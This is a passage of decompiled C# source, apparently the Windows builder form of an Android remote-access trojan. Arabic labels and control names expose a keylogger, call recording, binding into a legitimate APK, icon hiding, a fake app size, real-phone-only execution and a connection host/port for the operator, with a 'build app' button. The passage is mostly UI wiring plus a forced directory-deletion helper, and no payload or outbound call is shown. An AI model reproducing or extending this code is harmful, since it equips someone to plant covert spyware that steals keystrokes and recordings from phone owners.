			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.randomidbtn_Click);
				Button randomidbtn = this._randomidbtn;
				if (randomidbtn != null)
				{
					randomidbtn.Click -= value2;
				}
				this._randomidbtn = value;
				randomidbtn = this._randomidbtn;
				if (randomidbtn != null)
				{
					randomidbtn.Click += value2;
				}
			}
		}

		// Token: 0x17000280 RID: 640
		// (get) Token: 0x06000918 RID: 2328 RVA: 0x00005D3D File Offset: 0x00003F3D
		// (set) Token: 0x06000919 RID: 2329 RVA: 0x000662EC File Offset: 0x000644EC
		internal virtual Label Label25 { get; set; }

		// Token: 0x17000281 RID: 641
		// (get) Token: 0x0600091A RID: 2330 RVA: 0x00005D45 File Offset: 0x00003F45
		// (set) Token: 0x0600091B RID: 2331 RVA: 0x00066300 File Offset: 0x00064500
		internal virtual Label Label24 { get; set; }

		// Token: 0x17000282 RID: 642
		// (get) Token: 0x0600091C RID: 2332 RVA: 0x00005D4D File Offset: 0x00003F4D
		// (set) Token: 0x0600091D RID: 2333 RVA: 0x00066314 File Offset: 0x00064514
		internal virtual TextBox Notmsg { get; set; }

		// Token: 0x17000283 RID: 643
		// (get) Token: 0x0600091E RID: 2334 RVA: 0x00005D55 File Offset: 0x00003F55
		// (set) Token: 0x0600091F RID: 2335 RVA: 0x00066328 File Offset: 0x00064528
		internal virtual TextBox Nottitle { get; set; }

		// Token: 0x17000284 RID: 644
		// (get) Token: 0x06000920 RID: 2336 RVA: 0x00005D5D File Offset: 0x00003F5D
		// (set) Token: 0x06000921 RID: 2337 RVA: 0x0006633C File Offset: 0x0006453C
		internal virtual Panel Panel4 { get; set; }

		// Token: 0x17000285 RID: 645
		// (get) Token: 0x06000922 RID: 2338 RVA: 0x00005D65 File Offset: 0x00003F65
		// (set) Token: 0x06000923 RID: 2339 RVA: 0x00066350 File Offset: 0x00064550
		internal virtual TextBox TextBox1 { get; set; }

		// Token: 0x17000286 RID: 646
		// (get) Token: 0x06000924 RID: 2340 RVA: 0x00005D6D File Offset: 0x00003F6D
		// (set) Token: 0x06000925 RID: 2341 RVA: 0x00066364 File Offset: 0x00064564
		internal virtual Button SelectedApk
		{
			[CompilerGenerated]
			get
			{
				return this._SelectedApk;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.SelectedApk_Click);
				Button selectedApk = this._SelectedApk;
				if (selectedApk != null)
				{
					selectedApk.Click -= value2;
				}
				this._SelectedApk = value;
				selectedApk = this._SelectedApk;
				if (selectedApk != null)
				{
					selectedApk.Click += value2;
				}
			}
		}

		// Token: 0x17000287 RID: 647
		// (get) Token: 0x06000926 RID: 2342 RVA: 0x00005D75 File Offset: 0x00003F75
		// (set) Token: 0x06000927 RID: 2343 RVA: 0x000663A8 File Offset: 0x000645A8
		internal virtual DrakeUIAvatar DrakeUIAvatar1
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIAvatar1;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIAvatar1_Click);
				DrakeUIAvatar drakeUIAvatar = this._DrakeUIAvatar1;
				if (drakeUIAvatar != null)
				{
					drakeUIAvatar.Click -= value2;
				}
				this._DrakeUIAvatar1 = value;
				drakeUIAvatar = this._DrakeUIAvatar1;
				if (drakeUIAvatar != null)
				{
					drakeUIAvatar.Click += value2;
				}
			}
		}

		// Token: 0x17000288 RID: 648
		// (get) Token: 0x06000928 RID: 2344 RVA: 0x00005D7D File Offset: 0x00003F7D
		// (set) Token: 0x06000929 RID: 2345 RVA: 0x000663EC File Offset: 0x000645EC
		internal virtual DrakeUIAvatar DrakeUIAvatar2
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIAvatar2;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIAvatar2_Click);
				DrakeUIAvatar drakeUIAvatar = this._DrakeUIAvatar2;
				if (drakeUIAvatar != null)
				{
					drakeUIAvatar.Click -= value2;
				}
				this._DrakeUIAvatar2 = value;
				drakeUIAvatar = this._DrakeUIAvatar2;
				if (drakeUIAvatar != null)
				{
					drakeUIAvatar.Click += value2;
				}
			}
		}

		// Token: 0x17000289 RID: 649
		// (get) Token: 0x0600092A RID: 2346 RVA: 0x00005D85 File Offset: 0x00003F85
		// (set) Token: 0x0600092B RID: 2347 RVA: 0x00066430 File Offset: 0x00064630
		internal virtual Label Label28 { get; set; }

		// Token: 0x1700028A RID: 650
		// (get) Token: 0x0600092C RID: 2348 RVA: 0x00005D8D File Offset: 0x00003F8D
		// (set) Token: 0x0600092D RID: 2349 RVA: 0x00066444 File Offset: 0x00064644
		internal virtual Label Label27 { get; set; }

		// Token: 0x1700028B RID: 651
		// (get) Token: 0x0600092E RID: 2350 RVA: 0x00005D95 File Offset: 0x00003F95
		// (set) Token: 0x0600092F RID: 2351 RVA: 0x00066458 File Offset: 0x00064658
		internal virtual Label Label30 { get; set; }

		// Token: 0x1700028C RID: 652
		// (get) Token: 0x06000930 RID: 2352 RVA: 0x00005D9D File Offset: 0x00003F9D
		// (set) Token: 0x06000931 RID: 2353 RVA: 0x0006646C File Offset: 0x0006466C
		internal virtual TextBox TextSize
		{
			[CompilerGenerated]
			get
			{
				return this._TextSize;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.TextSize_TextChanged);
				TextBox textSize = this._TextSize;
				if (textSize != null)
				{
					textSize.TextChanged -= value2;
				}
				this._TextSize = value;
				textSize = this._TextSize;
				if (textSize != null)
				{
					textSize.TextChanged += value2;
				}
			}
		}

		// Token: 0x1700028D RID: 653
		// (get) Token: 0x06000932 RID: 2354 RVA: 0x00005DA5 File Offset: 0x00003FA5
		// (set) Token: 0x06000933 RID: 2355 RVA: 0x000664B0 File Offset: 0x000646B0
		internal virtual DrakeUICheckBox CheckFakeSize { get; set; }

		// Token: 0x1700028E RID: 654
		// (get) Token: 0x06000934 RID: 2356 RVA: 0x00005DAD File Offset: 0x00003FAD
		// (set) Token: 0x06000935 RID: 2357 RVA: 0x000664C4 File Offset: 0x000646C4
		internal virtual PictureBox PictureBox2 { get; set; }

		// Token: 0x1700028F RID: 655
		// (get) Token: 0x06000936 RID: 2358 RVA: 0x00005DB5 File Offset: 0x00003FB5
		// (set) Token: 0x06000937 RID: 2359 RVA: 0x000664D8 File Offset: 0x000646D8
		internal virtual PictureBox PictureBox1 { get; set; }

		// Token: 0x17000290 RID: 656
		// (get) Token: 0x06000938 RID: 2360 RVA: 0x00005DBD File Offset: 0x00003FBD
		// (set) Token: 0x06000939 RID: 2361 RVA: 0x000664EC File Offset: 0x000646EC
		internal virtual Button Button3
		{
			[CompilerGenerated]
			get
			{
				return this._Button3;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.Button3_Click);
				Button button = this._Button3;
				if (button != null)
				{
					button.Click -= value2;
				}
				this._Button3 = value;
				button = this._Button3;
				if (button != null)
				{
					button.Click += value2;
				}
			}
		}

		// Token: 0x17000291 RID: 657
		// (get) Token: 0x0600093A RID: 2362 RVA: 0x00005DC5 File Offset: 0x00003FC5
		// (set) Token: 0x0600093B RID: 2363 RVA: 0x00066530 File Offset: 0x00064730
		internal virtual Label Label32 { get; set; }

		// Token: 0x17000292 RID: 658
		// (get) Token: 0x0600093C RID: 2364 RVA: 0x00005DCD File Offset: 0x00003FCD
		// (set) Token: 0x0600093D RID: 2365 RVA: 0x00066544 File Offset: 0x00064744
		internal virtual TextBox logbtntext { get; set; }

		// Token: 0x17000293 RID: 659
		// (get) Token: 0x0600093E RID: 2366 RVA: 0x00005DD5 File Offset: 0x00003FD5
		// (set) Token: 0x0600093F RID: 2367 RVA: 0x00066558 File Offset: 0x00064758
		internal virtual Label Label31 { get; set; }

		// Token: 0x17000294 RID: 660
		// (get) Token: 0x06000940 RID: 2368 RVA: 0x00005DDD File Offset: 0x00003FDD
		// (set) Token: 0x06000941 RID: 2369 RVA: 0x0006656C File Offset: 0x0006476C
		internal virtual TextBox logbodytext { get; set; }

		// Token: 0x17000295 RID: 661
		// (get) Token: 0x06000942 RID: 2370 RVA: 0x00005DE5 File Offset: 0x00003FE5
		// (set) Token: 0x06000943 RID: 2371 RVA: 0x00066580 File Offset: 0x00064780
		internal virtual Label Label29 { get; set; }

		// Token: 0x17000296 RID: 662
		// (get) Token: 0x06000944 RID: 2372 RVA: 0x00005DED File Offset: 0x00003FED
		// (set) Token: 0x06000945 RID: 2373 RVA: 0x00066594 File Offset: 0x00064794
		internal virtual TextBox logtitletext { get; set; }

		// Token: 0x17000297 RID: 663
		// (get) Token: 0x06000946 RID: 2374 RVA: 0x00005DF5 File Offset: 0x00003FF5
		// (set) Token: 0x06000947 RID: 2375 RVA: 0x000665A8 File Offset: 0x000647A8
		internal virtual Panel Panel5 { get; set; }

		// Token: 0x17000298 RID: 664
		// (get) Token: 0x06000948 RID: 2376 RVA: 0x00005DFD File Offset: 0x00003FFD
		// (set) Token: 0x06000949 RID: 2377 RVA: 0x000665BC File Offset: 0x000647BC
		internal virtual Label Label17 { get; set; }

		// Token: 0x17000299 RID: 665
		// (get) Token: 0x0600094A RID: 2378 RVA: 0x00005E05 File Offset: 0x00004005
		// (set) Token: 0x0600094B RID: 2379 RVA: 0x000665D0 File Offset: 0x000647D0
		internal virtual Label Label26 { get; set; }

		// Token: 0x1700029A RID: 666
		// (get) Token: 0x0600094C RID: 2380 RVA: 0x00005E0D File Offset: 0x0000400D
		// (set) Token: 0x0600094D RID: 2381 RVA: 0x000665E4 File Offset: 0x000647E4
		internal virtual TextBox trgtbkg { get; set; }

		// Token: 0x1700029B RID: 667
		// (get) Token: 0x0600094E RID: 2382 RVA: 0x00005E15 File Offset: 0x00004015
		// (set) Token: 0x0600094F RID: 2383 RVA: 0x000665F8 File Offset: 0x000647F8
		internal virtual Label Label10 { get; set; }

		// Token: 0x1700029C RID: 668
		// (get) Token: 0x06000950 RID: 2384 RVA: 0x00005E1D File Offset: 0x0000401D
		// (set) Token: 0x06000951 RID: 2385 RVA: 0x0006660C File Offset: 0x0006480C
		internal virtual Label AutoRec { get; set; }

		// Token: 0x1700029D RID: 669
		// (get) Token: 0x06000952 RID: 2386 RVA: 0x00005E25 File Offset: 0x00004025
		// (set) Token: 0x06000953 RID: 2387 RVA: 0x00066620 File Offset: 0x00064820
		internal virtual Label Label19 { get; set; }

		// Token: 0x1700029E RID: 670
		// (get) Token: 0x06000954 RID: 2388 RVA: 0x00005E2D File Offset: 0x0000402D
		// (set) Token: 0x06000955 RID: 2389 RVA: 0x00066634 File Offset: 0x00064834
		internal virtual MetroSetComboBox checkver { get; set; }

		// Token: 0x1700029F RID: 671
		// (get) Token: 0x06000956 RID: 2390 RVA: 0x00005E35 File Offset: 0x00004035
		// (set) Token: 0x06000957 RID: 2391 RVA: 0x00066648 File Offset: 0x00064848
		internal virtual Label Label16 { get; set; }

		// Token: 0x170002A0 RID: 672
		// (get) Token: 0x06000958 RID: 2392 RVA: 0x00005E3D File Offset: 0x0000403D
		// (set) Token: 0x06000959 RID: 2393 RVA: 0x0006665C File Offset: 0x0006485C
		internal virtual Label Label18 { get; set; }

		// Token: 0x170002A1 RID: 673
		// (get) Token: 0x0600095A RID: 2394 RVA: 0x00005E45 File Offset: 0x00004045
		// (set) Token: 0x0600095B RID: 2395 RVA: 0x00066670 File Offset: 0x00064870
		internal virtual Label Label14 { get; set; }

		// Token: 0x170002A2 RID: 674
		// (get) Token: 0x0600095C RID: 2396 RVA: 0x00005E4D File Offset: 0x0000404D
		// (set) Token: 0x0600095D RID: 2397 RVA: 0x00066684 File Offset: 0x00064884
		internal virtual Label Label15 { get; set; }

		// Token: 0x170002A3 RID: 675
		// (get) Token: 0x0600095E RID: 2398 RVA: 0x00005E55 File Offset: 0x00004055
		// (set) Token: 0x0600095F RID: 2399 RVA: 0x00066698 File Offset: 0x00064898
		internal virtual Label Label6
		{
			[CompilerGenerated]
			get
			{
				return this._Label6;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.Label6_Click);
				Label label = this._Label6;
				if (label != null)
				{
					label.Click -= value2;
				}
				this._Label6 = value;
				label = this._Label6;
				if (label != null)
				{
					label.Click += value2;
				}
			}
		}

		// Token: 0x170002A4 RID: 676
		// (get) Token: 0x06000960 RID: 2400 RVA: 0x00005E5D File Offset: 0x0000405D
		// (set) Token: 0x06000961 RID: 2401 RVA: 0x000666DC File Offset: 0x000648DC
		internal virtual Label Label13 { get; set; }

		// Token: 0x170002A5 RID: 677
		// (get) Token: 0x06000962 RID: 2402 RVA: 0x00005E65 File Offset: 0x00004065
		// (set) Token: 0x06000963 RID: 2403 RVA: 0x000666F0 File Offset: 0x000648F0
		internal virtual Label Label8 { get; set; }

		// Token: 0x170002A6 RID: 678
		// (get) Token: 0x06000964 RID: 2404 RVA: 0x00005E6D File Offset: 0x0000406D
		// (set) Token: 0x06000965 RID: 2405 RVA: 0x00066704 File Offset: 0x00064904
		internal virtual DrakeUIComboBox comboproms { get; set; }

		// Token: 0x170002A7 RID: 679
		// (get) Token: 0x06000966 RID: 2406 RVA: 0x00005E75 File Offset: 0x00004075
		// (set) Token: 0x06000967 RID: 2407 RVA: 0x00066718 File Offset: 0x00064918
		internal virtual Button removeactiv
		{
			[CompilerGenerated]
			get
			{
				return this._removeactiv;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.removeactiv_Click);
				Button removeactiv = this._removeactiv;
				if (removeactiv != null)
				{
					removeactiv.Click -= value2;
				}
				this._removeactiv = value;
				removeactiv = this._removeactiv;
				if (removeactiv != null)
				{
					removeactiv.Click += value2;
				}
			}
		}

		// Token: 0x170002A8 RID: 680
		// (get) Token: 0x06000968 RID: 2408 RVA: 0x00005E7D File Offset: 0x0000407D
		// (set) Token: 0x06000969 RID: 2409 RVA: 0x0006675C File Offset: 0x0006495C
		internal virtual DrakeUIListBox Primslist { get; set; }

		// Token: 0x170002A9 RID: 681
		// (get) Token: 0x0600096A RID: 2410 RVA: 0x00005E85 File Offset: 0x00004085
		// (set) Token: 0x0600096B RID: 2411 RVA: 0x00066770 File Offset: 0x00064970
		internal virtual Button addactiv
		{
			[CompilerGenerated]
			get
			{
				return this._addactiv;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.addactiv_Click);
				Button addactiv = this._addactiv;
				if (addactiv != null)
				{
					addactiv.Click -= value2;
				}
				this._addactiv = value;
				addactiv = this._addactiv;
				if (addactiv != null)
				{
					addactiv.Click += value2;
				}
			}
		}

		// Token: 0x170002AA RID: 682
		// (get) Token: 0x0600096C RID: 2412 RVA: 0x00005E8D File Offset: 0x0000408D
		// (set) Token: 0x0600096D RID: 2413 RVA: 0x000667B4 File Offset: 0x000649B4
		internal virtual TextBox explaintoolstext { get; set; }

		// Token: 0x170002AB RID: 683
		// (get) Token: 0x0600096E RID: 2414 RVA: 0x00005E95 File Offset: 0x00004095
		// (set) Token: 0x0600096F RID: 2415 RVA: 0x000667C8 File Offset: 0x000649C8
		internal virtual Label Label33
		{
			[CompilerGenerated]
			get
			{
				return this._Label33;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.Label33_MouseEnter);
				EventHandler value3 = new EventHandler(this.Label33_MouseLeave);
				Label label = this._Label33;
				if (label != null)
				{
					label.MouseEnter -= value2;
					label.MouseLeave -= value3;
				}
				this._Label33 = value;
				label = this._Label33;
				if (label != null)
				{
					label.MouseEnter += value2;
					label.MouseLeave += value3;
				}
			}
		}

		// Token: 0x170002AC RID: 684
		// (get) Token: 0x06000970 RID: 2416 RVA: 0x00005E9D File Offset: 0x0000409D
		// (set) Token: 0x06000971 RID: 2417 RVA: 0x00066828 File Offset: 0x00064A28
		internal virtual Label Label34 { get; set; }

		// Token: 0x170002AD RID: 685
		// (get) Token: 0x06000972 RID: 2418 RVA: 0x00005EA5 File Offset: 0x000040A5
		// (set) Token: 0x06000973 RID: 2419 RVA: 0x0006683C File Offset: 0x00064A3C
		internal virtual Label Label35
		{
			[CompilerGenerated]
			get
			{
				return this._Label35;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.Label35_MouseEnter);
				EventHandler value3 = new EventHandler(this.Label35_MouseLeave);
				Label label = this._Label35;
				if (label != null)
				{
					label.MouseEnter -= value2;
					label.MouseLeave -= value3;
				}
				this._Label35 = value;
				label = this._Label35;
				if (label != null)
				{
					label.MouseEnter += value2;
					label.MouseLeave += value3;
				}
			}
		}

		// Token: 0x170002AE RID: 686
		// (get) Token: 0x06000974 RID: 2420 RVA: 0x00005EAD File Offset: 0x000040AD
		// (set) Token: 0x06000975 RID: 2421 RVA: 0x0006689C File Offset: 0x00064A9C
		internal virtual Label Label36 { get; set; }

		// Token: 0x170002AF RID: 687
		// (get) Token: 0x06000976 RID: 2422 RVA: 0x00005EB5 File Offset: 0x000040B5
		// (set) Token: 0x06000977 RID: 2423 RVA: 0x000668B0 File Offset: 0x00064AB0
		internal virtual Button randomverbtn
		{
			[CompilerGenerated]
			get
			{
				return this._randomverbtn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.randomverbtn_Click);
				Button randomverbtn = this._randomverbtn;
				if (randomverbtn != null)
				{
					randomverbtn.Click -= value2;
				}
				this._randomverbtn = value;
				randomverbtn = this._randomverbtn;
				if (randomverbtn != null)
				{
					randomverbtn.Click += value2;
				}
			}
		}

		// Token: 0x170002B0 RID: 688
		// (get) Token: 0x06000978 RID: 2424 RVA: 0x00005EBD File Offset: 0x000040BD
		// (set) Token: 0x06000979 RID: 2425 RVA: 0x000668F4 File Offset: 0x00064AF4
		internal virtual Label Label37 { get; set; }

		// Token: 0x170002B1 RID: 689
		// (get) Token: 0x0600097A RID: 2426 RVA: 0x00005EC5 File Offset: 0x000040C5
		// (set) Token: 0x0600097B RID: 2427 RVA: 0x00066908 File Offset: 0x00064B08
		internal virtual TextBox dscriptext { get; set; }

		// Token: 0x170002B2 RID: 690
		// (get) Token: 0x0600097C RID: 2428 RVA: 0x00005ECD File Offset: 0x000040CD
		// (set) Token: 0x0600097D RID: 2429 RVA: 0x0006691C File Offset: 0x00064B1C
		internal virtual Label sizelabel { get; set; }

		// Token: 0x170002B3 RID: 691
		// (get) Token: 0x0600097E RID: 2430 RVA: 0x00005ED5 File Offset: 0x000040D5
		// (set) Token: 0x0600097F RID: 2431 RVA: 0x00066930 File Offset: 0x00064B30
		internal virtual DrakeUITabControl TABCTRL { get; set; }

		// Token: 0x170002B4 RID: 692
		// (get) Token: 0x06000980 RID: 2432 RVA: 0x00005EDD File Offset: 0x000040DD
		// (set) Token: 0x06000981 RID: 2433 RVA: 0x00066944 File Offset: 0x00064B44
		internal virtual TabPage TabPage4 { get; set; }

		// Token: 0x170002B5 RID: 693
		// (get) Token: 0x06000982 RID: 2434 RVA: 0x00005EE5 File Offset: 0x000040E5
		// (set) Token: 0x06000983 RID: 2435 RVA: 0x00066958 File Offset: 0x00064B58
		internal virtual TabPage TabPage9 { get; set; }

		// Token: 0x170002B6 RID: 694
		// (get) Token: 0x06000984 RID: 2436 RVA: 0x00005EED File Offset: 0x000040ED
		// (set) Token: 0x06000985 RID: 2437 RVA: 0x0006696C File Offset: 0x00064B6C
		internal virtual TabPage TabPage10 { get; set; }

		// Token: 0x170002B7 RID: 695
		// (get) Token: 0x06000986 RID: 2438 RVA: 0x00005EF5 File Offset: 0x000040F5
		// (set) Token: 0x06000987 RID: 2439 RVA: 0x00066980 File Offset: 0x00064B80
		internal virtual TabPage TabPage11 { get; set; }

		// Token: 0x170002B8 RID: 696
		// (get) Token: 0x06000988 RID: 2440 RVA: 0x00005EFD File Offset: 0x000040FD
		// (set) Token: 0x06000989 RID: 2441 RVA: 0x00066994 File Offset: 0x00064B94
		internal virtual TabPage TabPage12 { get; set; }

		// Token: 0x170002B9 RID: 697
		// (get) Token: 0x0600098A RID: 2442 RVA: 0x00005F05 File Offset: 0x00004105
		// (set) Token: 0x0600098B RID: 2443 RVA: 0x000669A8 File Offset: 0x00064BA8
		internal virtual Panel Panel6 { get; set; }

		// Token: 0x170002BA RID: 698
		// (get) Token: 0x0600098C RID: 2444 RVA: 0x00005F0D File Offset: 0x0000410D
		// (set) Token: 0x0600098D RID: 2445 RVA: 0x000669BC File Offset: 0x00064BBC
		internal virtual TabPage TabPage13 { get; set; }

		// Token: 0x170002BB RID: 699
		// (get) Token: 0x0600098E RID: 2446 RVA: 0x00005F15 File Offset: 0x00004115
		// (set) Token: 0x0600098F RID: 2447 RVA: 0x000669D0 File Offset: 0x00064BD0
		internal virtual Panel Panel7 { get; set; }

		// Token: 0x170002BC RID: 700
		// (get) Token: 0x06000990 RID: 2448 RVA: 0x00005F1D File Offset: 0x0000411D
		// (set) Token: 0x06000991 RID: 2449 RVA: 0x000669E4 File Offset: 0x00064BE4
		internal virtual TabPage TabPage14 { get; set; }

		// Token: 0x170002BD RID: 701
		// (get) Token: 0x06000992 RID: 2450 RVA: 0x00005F25 File Offset: 0x00004125
		// (set) Token: 0x06000993 RID: 2451 RVA: 0x000669F8 File Offset: 0x00064BF8
		internal virtual TextBox errorlogs { get; set; }

		// Token: 0x170002BE RID: 702
		// (get) Token: 0x06000994 RID: 2452 RVA: 0x00005F2D File Offset: 0x0000412D
		// (set) Token: 0x06000995 RID: 2453 RVA: 0x00066A0C File Offset: 0x00064C0C
		internal virtual Panel Panel8 { get; set; }

		// Token: 0x170002BF RID: 703
		// (get) Token: 0x06000996 RID: 2454 RVA: 0x00005F35 File Offset: 0x00004135
		// (set) Token: 0x06000997 RID: 2455 RVA: 0x00066A20 File Offset: 0x00064C20
		internal virtual Label Label40 { get; set; }

		// Token: 0x170002C0 RID: 704
		// (get) Token: 0x06000998 RID: 2456 RVA: 0x00005F3D File Offset: 0x0000413D
		// (set) Token: 0x06000999 RID: 2457 RVA: 0x00066A34 File Offset: 0x00064C34
		internal virtual Label Label39 { get; set; }

		// Token: 0x170002C1 RID: 705
		// (get) Token: 0x0600099A RID: 2458 RVA: 0x00005F45 File Offset: 0x00004145
		// (set) Token: 0x0600099B RID: 2459 RVA: 0x00066A48 File Offset: 0x00064C48
		internal virtual DrakeUICheckBox CheckDraw { get; set; }

		// Token: 0x170002C2 RID: 706
		// (get) Token: 0x0600099C RID: 2460 RVA: 0x00005F4D File Offset: 0x0000414D
		// (set) Token: 0x0600099D RID: 2461 RVA: 0x00066A5C File Offset: 0x00064C5C
		internal virtual DrakeUICheckBox checkemo { get; set; }

		// Token: 0x170002C3 RID: 707
		// (get) Token: 0x0600099E RID: 2462 RVA: 0x00005F55 File Offset: 0x00004155
		// (set) Token: 0x0600099F RID: 2463 RVA: 0x00066A70 File Offset: 0x00064C70
		internal virtual DrakeUICheckBox CheckRecord { get; set; }

		// Token: 0x170002C4 RID: 708
		// (get) Token: 0x060009A0 RID: 2464 RVA: 0x00005F5D File Offset: 0x0000415D
		// (set) Token: 0x060009A1 RID: 2465 RVA: 0x00066A84 File Offset: 0x00064C84
		internal virtual DrakeUICheckBox Checksuper { get; set; }

		// Token: 0x170002C5 RID: 709
		// (get) Token: 0x060009A2 RID: 2466 RVA: 0x00005F65 File Offset: 0x00004165
		// (set) Token: 0x060009A3 RID: 2467 RVA: 0x00066A98 File Offset: 0x00064C98
		internal virtual DrakeUICheckBox checkkeyloger { get; set; }

		// Token: 0x170002C6 RID: 710
		// (get) Token: 0x060009A4 RID: 2468 RVA: 0x00005F6D File Offset: 0x0000416D
		// (set) Token: 0x060009A5 RID: 2469 RVA: 0x00066AAC File Offset: 0x00064CAC
		internal virtual DrakeUICheckBox CheckQuick
		{
			[CompilerGenerated]
			get
			{
				return this._CheckQuick;
			}
			[CompilerGenerated]
			set
			{
				MouseEventHandler value2 = new MouseEventHandler(this.CheckQuick_MouseClick);
				MouseEventHandler value3 = new MouseEventHandler(this.CheckQuick_MouseClick_1);
				DrakeUICheckBox checkQuick = this._CheckQuick;
				if (checkQuick != null)
				{
					checkQuick.MouseClick -= value2;
					checkQuick.MouseClick -= value3;
				}
				this._CheckQuick = value;
				checkQuick = this._CheckQuick;
				if (checkQuick != null)
				{
					checkQuick.MouseClick += value2;
					checkQuick.MouseClick += value3;
				}
			}
		}

		// Token: 0x170002C7 RID: 711
		// (get) Token: 0x060009A6 RID: 2470 RVA: 0x00005F75 File Offset: 0x00004175
		// (set) Token: 0x060009A7 RID: 2471 RVA: 0x00066B0C File Offset: 0x00064D0C
		internal virtual DrakeUICheckBox CheckBIND
		{
			[CompilerGenerated]
			get
			{
				return this._CheckBIND;
			}
			[CompilerGenerated]
			set
			{
				MouseEventHandler value2 = new MouseEventHandler(this.CheckBIND_MouseClick);
				DrakeUICheckBox checkBIND = this._CheckBIND;
				if (checkBIND != null)
				{
					checkBIND.MouseClick -= value2;
				}
				this._CheckBIND = value;
				checkBIND = this._CheckBIND;
				if (checkBIND != null)
				{
					checkBIND.MouseClick += value2;
				}
			}
		}

		// Token: 0x170002C8 RID: 712
		// (get) Token: 0x060009A8 RID: 2472 RVA: 0x00005F7D File Offset: 0x0000417D
		// (set) Token: 0x060009A9 RID: 2473 RVA: 0x00066B50 File Offset: 0x00064D50
		internal virtual DrakeUICheckBox CheckIconPatch
		{
			[CompilerGenerated]
			get
			{
				return this._CheckIconPatch;
			}
			[CompilerGenerated]
			set
			{
				MouseEventHandler value2 = new MouseEventHandler(this.CheckIconPatch_MouseClick);
				DrakeUICheckBox checkIconPatch = this._CheckIconPatch;
				if (checkIconPatch != null)
				{
					checkIconPatch.MouseClick -= value2;
				}
				this._CheckIconPatch = value;
				checkIconPatch = this._CheckIconPatch;
				if (checkIconPatch != null)
				{
					checkIconPatch.MouseClick += value2;
				}
			}
		}

		// Token: 0x170002C9 RID: 713
		// (get) Token: 0x060009AA RID: 2474 RVA: 0x00005F85 File Offset: 0x00004185
		// (set) Token: 0x060009AB RID: 2475 RVA: 0x00066B94 File Offset: 0x00064D94
		internal virtual DrakeUICheckBox CheckDoze { get; set; }

		// Token: 0x170002CA RID: 714
		// (get) Token: 0x060009AC RID: 2476 RVA: 0x00005F8D File Offset: 0x0000418D
		// (set) Token: 0x060009AD RID: 2477 RVA: 0x00066BA8 File Offset: 0x00064DA8
		internal virtual DrakeUICheckBox CheckAllPrims
		{
			[CompilerGenerated]
			get
			{
				return this._CheckAllPrims;
			}
			[CompilerGenerated]
			set
			{
				MouseEventHandler value2 = new MouseEventHandler(this.CheckAllPrims_MouseClick);
				DrakeUICheckBox checkAllPrims = this._CheckAllPrims;
				if (checkAllPrims != null)
				{
					checkAllPrims.MouseClick -= value2;
				}
				this._CheckAllPrims = value;
				checkAllPrims = this._CheckAllPrims;
				if (checkAllPrims != null)
				{
					checkAllPrims.MouseClick += value2;
				}
			}
		}

		// Token: 0x170002CB RID: 715
		// (get) Token: 0x060009AE RID: 2478 RVA: 0x00005F95 File Offset: 0x00004195
		// (set) Token: 0x060009AF RID: 2479 RVA: 0x00066BEC File Offset: 0x00064DEC
		internal virtual DrakeUICheckBox CheckHide { get; set; }

		// Token: 0x060009B0 RID: 2480 RVA: 0x00066C00 File Offset: 0x00064E00
		public static void smethod_0(string string_70)
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(Path.GetTempPath() + "\\TempEmptyDirectory-" + Guid.NewGuid().ToString());
			try
			{
				directoryInfo.Create();
				using (Process process = new Process())
				{
					process.StartInfo.FileName = "robocopy.exe";
					process.StartInfo.Arguments = string.Concat(new string[]
					{
						"\"",
						directoryInfo.FullName,
						"\" \"",
						string_70,
						"\" /mir /r:1 /w:1 /np /xj /sl"
					});
					process.StartInfo.UseShellExecute = false;
					process.StartInfo.CreateNoWindow = true;
					process.Start();
					process.WaitForExit();
				}
				directoryInfo.Delete();
				DirectoryInfo directoryInfo2 = new DirectoryInfo(string_70);
				directoryInfo2.Attributes = FileAttributes.Normal;
				Directory.Delete(string_70);
			}
			catch (IOException prompt)
			{
				Interaction.MsgBox(prompt, MsgBoxStyle.OkOnly, null);
			}
		}

		// Token: 0x060009B1 RID: 2481 RVA: 0x00066D24 File Offset: 0x00064F24
		public void method_0()
		{
			string left = Module4.smethod_1();
			if (Operators.CompareString(left, "AR", false) == 0)
			{
				this.MainText.Text = "الأيبي \\ هوست";
				this.Label1.Text = "منفذ الاتصال";
				this.Label20.Text = "بعد التثبيت";
				this.sizelabel.Text = "حجم التطبيق";
				this.keeplivelabel.Text = "البقاء متصل";
				this.Label22.Text = "إسم التطبيق";
				this.Label23.Text = "رابط الموقع";
				this.Button1.Text = "أيقونة التطبيق";
				this.Label27.Text = "تطبيق مخصص";
				this.CheckFakeSize.Text = "إضافة جحم لتطبيق";
				this.Label28.Text = "إشعار مخصص";
				this.Label24.Text = "عنوان الشعار";
				this.Label25.Text = "محتوى الأشعار";
				this.Label25.Text = "البقاء متصل";
				this.Label2.Text = "إسم المستخدم";
				this.Label3.Text = "إسم التطبيق";
				this.Label9.Text = "إصدار التطبيق";
				this.Label4.Text = "معرف التطبيق";
				this.Label11.Text = "الأيقونة";
				this.Label15.Text = "مسجل المفاتيح";
				this.Label18.Text = "تشغيل فقط على هواتف حقيقة";
				this.Label13.Text = "الوضع الخارق";
				this.AutoRec.Text = "تسجيل المكالمات";
				this.Label10.Text = "دمج";
				this.Label26.Text = "معرف التطبيق المدموج";
				this.Label19.Text = "إصدار التطبيق";
				this.Label29.Text = "العنوان";
				this.Label31.Text = "رسالة الترحيب";
				this.Label32.Text = "زر التفعيل";
				this.Button3.Text = "الوضع الأفتراضي";
				this.SelectedApk.Text = "بناء التطبيق";
				this.TABCTRL.TabPages[0].Text = "الإتصال";
				this.TABCTRL.TabPages[1].Text = "خيارات";
